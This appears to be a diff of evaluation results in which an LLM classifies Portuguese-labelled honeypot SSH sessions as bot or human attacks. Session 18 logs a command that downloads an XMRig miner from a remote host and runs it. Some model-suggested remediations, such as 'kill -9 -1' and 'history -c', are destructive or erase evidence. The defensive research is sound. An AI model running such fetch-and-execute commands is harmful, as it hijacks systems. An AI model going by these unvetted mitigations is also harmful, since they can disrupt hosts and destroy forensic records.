-    "tempo_segundos_api": 1.26,
+    "classificacao_prompt_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_neutro_sem_tempos": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.43,
     "resposta_crua_prompt_neutro": {
       "actor_type": "BOT_AUTOMATIZADO",
       "severity_level": "BAIXO",
-      "summary": "O invasor executou um comando simples echo para teste de conectividade ou verificação de resposta do sistema, típico de varreduras automatizadas.",
+      "summary": "O invasor executou um comando simples echo para teste de conectividade ou verificação de banner, típico de varreduras automatizadas.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "echo xsec"
+        }
+      ],
+      "mitigation_commands": [
+        "passwd -l root",
+        "sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config",
+        "systemctl restart sshd"
+      ],
+      "session_id": "bot_12_1c8f5073b214",
+      "src_ip": "194.26.29.114",
+      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
+      "tempo_segundos": 1.43,
+      "comandos": [
+        "echo xsec"
+      ]
+    },
+    "resposta_crua_prompt_neutro_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "Execução rápida e isolada de comando único genérico típica de varredura ou verificação automatizada de honeypot.",
       "mitre_attack": [
         {
           "tactic": "Discovery",
@@ -401,7 +871,7 @@
       ],
       "session_id": "bot_12_1c8f5073b214",
       "src_ip": "194.26.29.114",
-      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
+      "etapa": "API_gemini-3.5-flash-lite",
       "tempo_segundos": 1.26,
       "comandos": [
         "echo xsec"
@@ -411,13 +881,24 @@
   {
     "ordem": 13,
     "session_id": "bot_13_9d4e6018c623",
+    "pausas_segundos": [
+      0
+    ],
+    "comandos_com_tempo": [
+      "[1] uname -s -v -n -r -m (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] uname -s -v -n -r -m"
+    ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "classificacao_prompt_neutro": "BOT_AUTOMATIZADO",
-    "tempo_segundos_api": 1.26,
+    "classificacao_prompt_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_neutro_sem_tempos": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.37,
     "resposta_crua_prompt_neutro": {
       "actor_type": "BOT_AUTOMATIZADO",
       "severity_level": "BAIXO",
-      "summary": "O invasor executou um único comando básico de coleta de informações do sistema operacional logo após a conexão, indicando varredura automatizada ou script de reconhecimento inicial.",
+      "summary": "O invasor executou um único comando básico de coleta de informações do sistema operacional ('uname -s -v -n -r -m'), típico de scripts automatizados de reconhecimento inicial (footprinting) logo após o estabelecimento de uma sessão SSH.",
       "mitre_attack": [
         {
           "tactic": "Discovery",
@@ -428,14 +909,40 @@
       ],
       "mitigation_commands": [
         "passwd -l ubuntu",
-        "ufw deny from 185.156.73.54 to any port 22",
-        "sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/g' /etc/ssh/sshd_config",
-        "systemctl restart sshd"
+        "sed -i 's/^PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config",
+        "sed -i 's/^PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config",
+        "systemctl restart sshd",
+        "iptables -A INPUT -s 185.156.73.54 -j DROP"
       ],
       "session_id": "bot_13_9d4e6018c623",
       "src_ip": "185.156.73.54",
       "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
-      "tempo_segundos": 1.26,
+      "tempo_segundos": 1.37,
+      "comandos": [
+        "uname -s -v -n -r -m"
+      ]
+    },
+    "resposta_crua_prompt_neutro_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "Execução única e imediata do comando uname para coleta de informações básicas do sistema logo após a autenticação, típico de scripts de reconhecimento automatizados ou botnets.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -s -v -n -r -m"
+        }
+      ],
+      "mitigation_commands": [
+        "passwd -l ubuntu",
+        "sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config",
+        "systemctl restart ssh"
+      ],
+      "session_id": "bot_13_9d4e6018c623",
+      "src_ip": "185.156.73.54",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.29,
       "comandos": [
         "uname -s -v -n -r -m"
       ]
@@ -444,13 +951,24 @@
   {
     "ordem": 14,
     "session_id": "bot_14_4f2a9081d309",
+    "pausas_segundos": [
+      0
+    ],
+    "comandos_com_tempo": [
+      "[1] cat /proc/cpuinfo (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] cat /proc/cpuinfo"
+    ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "classificacao_prompt_neutro": "BOT_AUTOMATIZADO",
-    "tempo_segundos_api": 1.22,
+    "classificacao_prompt_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_neutro_sem_tempos": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.15,
     "resposta_crua_prompt_neutro": {
       "actor_type": "BOT_AUTOMATIZADO",
       "severity_level": "BAIXO",
-      "summary": "O invasor realizou uma consulta básica às informações da CPU logo após o acesso inicial, comportamento típico de scripts automatizados de reconhecimento e coleta de informações do sistema.",
+      "summary": "O invasor executou um único comando para coletar informações sobre a CPU do sistema, comportamento típico de scripts automatizados de reconhecimento e fingerprinting de honeypots ou botnets.",
       "mitre_attack": [
         {
           "tactic": "Discovery",
@@ -461,14 +979,39 @@
       ],
       "mitigation_commands": [
         "passwd -l root",
-        "sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config",
-        "systemctl restart sshd",
-        "iptables -A INPUT -s 5.188.206.14 -j DROP"
+        "sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config",
+        "systemctl restart sshd"
       ],
       "session_id": "bot_14_4f2a9081d309",
       "src_ip": "5.188.206.14",
       "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
-      "tempo_segundos": 1.22,
+      "tempo_segundos": 1.15,
+      "comandos": [
+        "cat /proc/cpuinfo"
+      ]
+    },
+    "resposta_crua_prompt_neutro_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "O endereço IP de origem executou um comando inicial comum de reconhecimento de hardware logo após a autenticação, típico de scripts automatizados de varredura ou infecção por malware.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "cat /proc/cpuinfo"
+        }
+      ],
+      "mitigation_commands": [
+        "passwd -l root",
+        "sed -i 's/^PermitRootLogin.*/PermitRootLogin no/g' /etc/ssh/sshd_config",
+        "systemctl restart sshd",
+        "ufw deny from 5.188.206.14 to any port 22"
+      ],
+      "session_id": "bot_14_4f2a9081d309",
+      "src_ip": "5.188.206.14",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.35,
       "comandos": [
         "cat /proc/cpuinfo"
       ]
@@ -477,13 +1020,24 @@
   {
     "ordem": 15,
     "session_id": "bot_15_7b5c1037e826",
+    "pausas_segundos": [
+      1
+    ],
+    "comandos_com_tempo": [
+      "[1] uname -s -v -n -r -m (+1s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] uname -s -v -n -r -m"
+    ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "classificacao_prompt_neutro": "BOT_AUTOMATIZADO",
-    "tempo_segundos_api": 1.15,
+    "classificacao_prompt_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_neutro_sem_tempos": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.17,
     "resposta_crua_prompt_neutro": {
       "actor_type": "BOT_AUTOMATIZADO",
       "severity_level": "BAIXO",
-      "summary": "O invasor realizou apenas uma verificação básica do sistema operacional utilizando o comando uname imediatamente após a autenticação, comportamento típico de scripts de reconhecimento automatizados.",
+      "summary": "A sessão consiste em um comando único de reconhecimento de sistema ('uname'), típico de varreduras automatizadas iniciais ou scripts de sondagem de botnets logo após a autenticação.",
       "mitre_attack": [
         {
           "tactic": "Discovery",
@@ -494,13 +1048,39 @@
       ],
       "mitigation_commands": [
         "passwd -l root",
-        "sed -i 's/^PermitRootLogin.*/PermitRootLogin no/g' /etc/ssh/sshd_config",
-        "systemctl restart sshd"
+        "sed -i 's/^PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config",
+        "systemctl restart sshd",
+        "iptables -A INPUT -s 141.98.11.45 -j DROP"
       ],
       "session_id": "bot_15_7b5c1037e826",
       "src_ip": "141.98.11.45",
       "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
-      "tempo_segundos": 1.15,
+      "tempo_segundos": 1.17,
+      "comandos": [
+        "uname -s -v -n -r -m"
+      ]
+    },
+    "resposta_crua_prompt_neutro_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "Execução rápida de um único comando para reconhecimento do sistema operacional, indicando sondagem automatizada comum de bots.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -s -v -n -r -m"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 141.98.11.45 -j DROP",
+        "passwd -l root",
+        "sed -i 's/^PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config"
+      ],
+      "session_id": "bot_15_7b5c1037e826",
+      "src_ip": "141.98.11.45",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.28,
       "comandos": [
         "uname -s -v -n -r -m"
       ]
@@ -509,13 +1089,24 @@
   {
     "ordem": 16,
     "session_id": "bot_16_3a9d4062f118",
+    "pausas_segundos": [
+      0
+    ],
+    "comandos_com_tempo": [
+      "[1] uname -a (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] uname -a"
+    ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "classificacao_prompt_neutro": "BOT_AUTOMATIZADO",
-    "tempo_segundos_api": 1.23,
+    "classificacao_prompt_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_neutro_sem_tempos": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.31,
     "resposta_crua_prompt_neutro": {
       "actor_type": "BOT_AUTOMATIZADO",
       "severity_level": "BAIXO",
-      "summary": "O invasor realizou apenas uma verificação básica de reconhecimento do sistema operacional executando 'uname -a' logo após a autenticação, comportamento típico de scripts de varredura ou botnets iniciais.",
+      "summary": "O invasor executou um único comando de enumeração básica do sistema logo após estabelecer a conexão SSH, comportamento típico de scripts automatizados de varredura ou reconhecimento inicial.",
       "mitre_attack": [
         {
           "tactic": "Discovery",
@@ -526,14 +1117,40 @@
       ],
       "mitigation_commands": [
         "passwd -l root",
-        "sed -i 's/^PermitRootLogin.*/PermitRootLogin no/g' /etc/ssh/sshd_config",
+        "sed -i 's/^PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config",
+        "systemctl restart sshd",
+        "fail2ban-client set sshd banip 179.43.176.50"
+      ],
+      "session_id": "bot_16_3a9d4062f118",
+      "src_ip": "179.43.176.50",
+      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
+      "tempo_segundos": 1.31,
+      "comandos": [
+        "uname -a"
+      ]
+    },
+    "resposta_crua_prompt_neutro_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "O invasor realizou apenas uma verificação básica do sistema (uname -a) logo após a conexão, comportamento típico de scripts automatizados de reconhecimento inicial ou scanners.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -a"
+        }
+      ],
+      "mitigation_commands": [
+        "passwd -l root",
+        "sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config",
         "systemctl restart sshd",
         "iptables -A INPUT -s 179.43.176.50 -j DROP"
       ],
       "session_id": "bot_16_3a9d4062f118",
       "src_ip": "179.43.176.50",
-      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
-      "tempo_segundos": 1.23,
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.19,
       "comandos": [
         "uname -a"
       ]
@@ -542,13 +1159,24 @@
   {
     "ordem": 17,
     "session_id": "bot_17_8e1f7029a405",
+    "pausas_segundos": [
+      0
+    ],
+    "comandos_com_tempo": [
+      "[1] uname -s -v -n -r -m (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] uname -s -v -n -r -m"
+    ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "classificacao_prompt_neutro": "BOT_AUTOMATIZADO",
-    "tempo_segundos_api": 1.23,
+    "classificacao_prompt_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_neutro_sem_tempos": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.29,
     "resposta_crua_prompt_neutro": {
       "actor_type": "BOT_AUTOMATIZADO",
       "severity_level": "BAIXO",
-      "summary": "O invasor executou um comando básico de coleta de informações sobre o sistema operacional e a arquitetura do hardware, indicando uma fase inicial de reconhecimento automatizado.",
+      "summary": "O invasor executou um comando básico de coleta de informações sobre o sistema operacional (uname) logo após o acesso inicial, comportamento típico de scripts de reconhecimento automatizados.",
       "mitre_attack": [
         {
           "tactic": "Discovery",
@@ -559,14 +1187,40 @@
       ],
       "mitigation_commands": [
         "passwd -l root",
-        "sed -i 's/^PermitRootLogin.*/PermitRootLogin no/g' /etc/ssh/sshd_config",
+        "sed -i 's/^PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config",
         "systemctl restart sshd",
         "iptables -A INPUT -s 185.220.101.7 -j DROP"
       ],
       "session_id": "bot_17_8e1f7029a405",
       "src_ip": "185.220.101.7",
       "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
-      "tempo_segundos": 1.23,
+      "tempo_segundos": 1.29,
+      "comandos": [
+        "uname -s -v -n -r -m"
+      ]
+    },
+    "resposta_crua_prompt_neutro_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "Execução rápida de um único comando de reconhecimento básico (uname) logo após a autenticação, típico de scripts automatizados de varredura ou infecção por botnets.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -s -v -n -r -m"
+        }
+      ],
+      "mitigation_commands": [
+        "passwd -l root",
+        "sed -i 's/^PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config",
+        "systemctl restart sshd",
+        "ufw deny from 185.220.101.7 to any port 22"
+      ],
+      "session_id": "bot_17_8e1f7029a405",
+      "src_ip": "185.220.101.7",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.16,
       "comandos": [
         "uname -s -v -n -r -m"
       ]
@@ -575,37 +1229,97 @@
   {
     "ordem": 18,
     "session_id": "bot_18_e19b44028c33",
+    "pausas_segundos": [
+      0,
+      0,
+      0,
+      1
+    ],
+    "comandos_com_tempo": [
+      "[1] cd /var/tmp (+0s)",
+      "[2] wget -q http://92.118.39.62/xmrig (+0s)",
+      "[3] chmod +x xmrig (+0s)",
+      "[4] ./xmrig (+1s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] cd /var/tmp",
+      "[2] wget -q http://92.118.39.62/xmrig",
+      "[3] chmod +x xmrig",
+      "[4] ./xmrig"
+    ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "classificacao_prompt_neutro": "BOT_AUTOMATIZADO",
-    "tempo_segundos_api": 1.42,
+    "classificacao_prompt_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_neutro_sem_tempos": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.55,
     "resposta_crua_prompt_neutro": {
       "actor_type": "BOT_AUTOMATIZADO",
       "severity_level": "ALTO",
-      "summary": "O invasor acessou o diretório temporário, baixou um binário do minerador XMRig usando wget, concedeu permissões de execução e iniciou o processo de mineração de criptomoedas de forma automatizada.",
+      "summary": "O invasor acessou o diretório temporário, baixou um minerador de criptomoedas conhecido (XMRig) de um servidor remoto, concedeu permissão de execução e iniciou o processo de mineração de forma automatizada.",
       "mitre_attack": [
         {
-          "tactic": "Impacto",
+          "tactic": "Impact",
           "technique_id": "T1496",
           "technique_name": "Resource Hijacking",
-          "evidence": "wget -q http://92.118.39.62/xmrig && chmod +x xmrig && ./xmrig"
+          "evidence": "wget -q http://92.118.39.62/xmrig e ./xmrig"
         },
         {
-          "tactic": "Comando e Controle",
+          "tactic": "Ingress Tool Transfer",
           "technique_id": "T1105",
           "technique_name": "Ingress Tool Transfer",
           "evidence": "wget -q http://92.118.39.62/xmrig"
         }
       ],
       "mitigation_commands": [
-        "pkill -9 xmrig",
+        "pkill xmrig",
+        "rm -f /var/tmp/xmrig",
+        "iptables -A INPUT -s 92.118.39.62 -j DROP"
+      ],
+      "session_id": "bot_18_e19b44028c33",
+      "src_ip": "92.118.39.62",
+      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
+      "tempo_segundos": 1.55,
+      "comandos": [
+        "cd /var/tmp",
+        "wget -q http://92.118.39.62/xmrig",
+        "chmod +x xmrig",
+        "./xmrig"
+      ]
+    },
+    "resposta_crua_prompt_neutro_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "ALTO",
+      "summary": "A sessão demonstra um comportamento típico de botnet ou script automatizado para infecção e mineração de criptomoedas, realizando o download, alteração de permissão e execução imediata do minerador XMRig em diretório temporário sem interação humana perceptível.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1204.002",
+          "technique_name": "User Execution: Malicious File",
+          "evidence": "./xmrig"
+        },
+        {
+          "tactic": "Command and Control",
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer",
+          "evidence": "wget -q http://92.118.39.62/xmrig"
+        },
+        {
+          "tactic": "Impact",
+          "technique_id": "T1496",
+          "technique_name": "Resource Hijacking",
+          "evidence": "Execução do binário XMRig para mineração de criptomoedas"
+        }
+      ],
+      "mitigation_commands": [
+        "killall xmrig",
         "rm -f /var/tmp/xmrig",
         "iptables -A INPUT -s 92.118.39.62 -j DROP",
         "passwd -l test"
       ],
       "session_id": "bot_18_e19b44028c33",
       "src_ip": "92.118.39.62",
-      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
-      "tempo_segundos": 1.42,
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.85,
       "comandos": [
         "cd /var/tmp",
         "wget -q http://92.118.39.62/xmrig",
@@ -617,13 +1331,24 @@
   {
     "ordem": 19,
     "session_id": "bot_19_5c7a3084b912",
+    "pausas_segundos": [
+      0
+    ],
+    "comandos_com_tempo": [
+      "[1] uname -s -v -n -r -m (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] uname -s -v -n -r -m"
+    ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "classificacao_prompt_neutro": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_neutro_sem_tempos": "BOT_AUTOMATIZADO",
     "tempo_segundos_api": 1.25,
     "resposta_crua_prompt_neutro": {
       "actor_type": "BOT_AUTOMATIZADO",
       "severity_level": "BAIXO",
-      "summary": "O invasor realizou uma consulta básica de reconhecimento do sistema logo após estabelecer a conexão SSH, comportamento típico de scripts de varredura automatizados.",
+      "summary": "O invasor realizou apenas um comando básico de coleta de informações sobre o sistema operacional logo após o acesso inicial, comportamento típico de scripts automatizados de reconhecimento e fingerprinting.",
       "mitre_attack": [
         {
           "tactic": "Discovery",
@@ -645,18 +1370,120 @@
       "comandos": [
         "uname -s -v -n -r -m"
       ]
+    },
+    "resposta_crua_prompt_neutro_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "Execução de comando único de reconhecimento de sistema ('uname') logo após a autenticação, típico de scripts automatizados de varredura ou infecção por botnets.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -s -v -n -r -m"
+        }
+      ],
+      "mitigation_commands": [
+        "passwd -l root",
+        "sed -i 's/^PermitRootLogin.*/PermitRootLogin no/g' /etc/ssh/sshd_config",
+        "systemctl restart sshd",
+        "iptables -A INPUT -s 195.54.160.149 -j DROP"
+      ],
+      "session_id": "bot_19_5c7a3084b912",
+      "src_ip": "195.54.160.149",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.25,
+      "comandos": [
+        "uname -s -v -n -r -m"
+      ]
     }
   },
   {
     "ordem": 20,
     "session_id": "bot_20_f91d83b42a11",
+    "pausas_segundos": [
+      1,
+      2,
+      3,
+      4,
+      4,
+      4
+    ],
+    "comandos_com_tempo": [
+      "[1] id (+1s)",
+      "[2] uname -a (+2s)",
+      "[3] cat /etc/issue (+3s)",
+      "[4] ls -la /tmp (+4s)",
+      "[5] cat /proc/cpuinfo (+4s)",
+      "[6] crontab -l (+4s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] id",
+      "[2] uname -a",
+      "[3] cat /etc/issue",
+      "[4] ls -la /tmp",
+      "[5] cat /proc/cpuinfo",
+      "[6] crontab -l"
+    ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "classificacao_prompt_neutro": "BOT_AUTOMATIZADO",
-    "tempo_segundos_api": 1.67,
+    "classificacao_prompt_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_neutro_sem_tempos": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.62,
     "resposta_crua_prompt_neutro": {
       "actor_type": "BOT_AUTOMATIZADO",
       "severity_level": "MÉDIO",
-      "summary": "Sequência típica de comandos de reconhecimento inicial (enumeration) executada automaticamente logo após o acesso root bem-sucedido.",
+      "summary": "O invasor executou uma sequência padrão de comandos de reconhecimento logo após o acesso inicial, típica de scripts automatizados de enumeração de sistema e pós-exploração.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1033",
+          "technique_name": "System Owner/User Discovery",
+          "evidence": "id"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -a, cat /etc/issue, cat /proc/cpuinfo"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1083",
+          "technique_name": "File and Directory Discovery",
+          "evidence": "ls -la /tmp"
+        },
+        {
+          "tactic": "Persistence",
+          "technique_id": "T1053.003",
+          "technique_name": "Scheduled Task/Job: Cron",
+          "evidence": "crontab -l"
+        }
+      ],
+      "mitigation_commands": [
+        "passwd root",
+        "history -c",
+        "iptables -A INPUT -s 198.51.100.200 -j DROP",
+        "sed -i '/PermitRootLogin/c\\PermitRootLogin no' /etc/ssh/sshd_config",
+        "systemctl restart sshd"
+      ],
+      "session_id": "bot_20_f91d83b42a11",
+      "src_ip": "198.51.100.200",
+      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
+      "tempo_segundos": 1.62,
+      "comandos": [
+        "id",
+        "uname -a",
+        "cat /etc/issue",
+        "ls -la /tmp",
+        "cat /proc/cpuinfo",
+        "crontab -l"
+      ]
+    },
+    "resposta_crua_prompt_neutro_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "MÉDIO",
+      "summary": "Sequência rápida e padronizada de comandos de reconhecimento de sistema e ambiente pós-exploração, típica de scripts automatizados de botnets ou malwares.",
       "mitre_attack": [
         {
           "tactic": "Discovery",
@@ -678,21 +1505,20 @@
         },
         {
           "tactic": "Discovery",
-          "technique_id": "T1518",
-          "technique_name": "Software Discovery",
+          "technique_id": "T1053",
+          "technique_name": "Scheduled Task/Job",
           "evidence": "crontab -l"
         }
       ],
       "mitigation_commands": [
+        "iptables -A INPUT -s 198.51.100.200 -j DROP",
         "passwd -l root",
-        "ufw deny from 198.51.100.200 to any port 22",
-        "sed -i 's/^PermitRootLogin.*/PermitRootLogin no/g' /etc/ssh/sshd_config",
-        "systemctl restart sshd"
+        "kill -9 -1"
       ],
       "session_id": "bot_20_f91d83b42a11",
       "src_ip": "198.51.100.200",
-      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
-      "tempo_segundos": 1.67,
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 3.42,
       "comandos": [
         "id",
         "uname -a",
@@ -706,13 +1532,39 @@
   {
     "ordem": 21,
     "session_id": "hum_01_dd2a67985225",
+    "pausas_segundos": [
+      1,
+      3,
+      6,
+      3,
+      6,
+      6
+    ],
+    "comandos_com_tempo": [
+      "[1] ls (+1s)",
+      "[2] mkdir teste123 (+3s)",
+      "[3] cd .. (+6s)",
+      "[4] ls (+3s)",
+      "[5] cd usr/ (+6s)",
+      "[6] exit (+6s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] ls",
+      "[2] mkdir teste123",
+      "[3] cd ..",
+      "[4] ls",
+      "[5] cd usr/",
+      "[6] exit"
+    ],
     "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
     "classificacao_prompt_neutro": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_prompt_neutro_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_prompt_neutro_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO",
     "tempo_segundos_api": 1.14,
     "resposta_crua_prompt_neutro": {
       "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
       "severity_level": "BAIXO",
-      "summary": "Sessão interativa com comandos manuais básicos de navegação no sistema de arquivos (ls, mkdir, cd) indicando exploração manual inicial.",
+      "summary": "Sessão interativa básica com navegação de diretórios e criação de pasta, indicando exploração manual inicial.",
       "mitre_attack": [
         {
           "tactic": "Discovery",
@@ -723,7 +1575,7 @@
       ],
       "mitigation_commands": [
         "passwd -l root",
-        "authselect select sssd"
+        "ufw deny from 198.51.100.25 to any port 22"
       ],
       "session_id": "hum_01_dd2a67985225",
       "src_ip": "198.51.100.25",
@@ -737,24 +1589,116 @@
         "cd usr/",
         "exit"
       ]
+    },
+    "resposta_crua_prompt_neutro_com_tempos": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "BAIXO",
+      "summary": "Sessão interativa caracterizada por exploração manual de diretórios e criação de pasta de teste, indicando presença humana e sondagem inicial sem uso de scripts automatizados.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1083",
+          "technique_name": "File and Directory Discovery",
+          "evidence": "ls"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "cd usr/ e navegação manual"
+        }
+      ],
+      "mitigation_commands": [
+        "passwd -l root",
+        "faillock --reset",
+        "auditctl -w /root -p wa -k root_watch"
+      ],
+      "session_id": "hum_01_dd2a67985225",
+      "src_ip": "198.51.100.25",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.26,
+      "comandos": [
+        "ls",
+        "mkdir teste123",
+        "cd ..",
+        "ls",
+        "cd usr/",
+        "exit"
+      ]
     }
   },
   {
     "ordem": 22,
     "session_id": "hum_02_01b6a903bd25",
+    "pausas_segundos": [
+      7,
+      13,
+      9
+    ],
+    "comandos_com_tempo": [
+      "[1] ls -a (+7s)",
+      "[2] cd .bashrc (+13s)",
+      "[3] ipconfig (+9s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] ls -a",
+      "[2] cd .bashrc",
+      "[3] ipconfig"
+    ],
     "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
     "classificacao_prompt_neutro": "ATAQUE_HUMANO_DIRECIONADO",
-    "tempo_segundos_api": 1.21,
+    "classificacao_prompt_neutro_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_prompt_neutro_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "tempo_segundos_api": 1.31,
     "resposta_crua_prompt_neutro": {
       "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "BAIXO",
+      "summary": "O usuário realizou comandos básicos de reconhecimento inicial de forma manual (como verificar arquivos ocultos, tentar entrar em um arquivo como diretório e checar configuração de rede), sugerindo um operador humano inexperiente ou explorando o ambiente manualmente.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "ipconfig"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1083",
+          "technique_name": "File and Directory Discovery",
+          "evidence": "ls -a"
+        }
+      ],
+      "mitigation_commands": [
+        "passwd -l root",
+        "last",
+        "history"
+      ],
+      "session_id": "hum_02_01b6a903bd25",
+      "src_ip": "198.51.100.25",
+      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
+      "tempo_segundos": 1.31,
+      "comandos": [
+        "ls -a",
+        "cd .bashrc",
+        "ipconfig"
+      ]
+    },
+    "resposta_crua_prompt_neutro_com_tempos": {
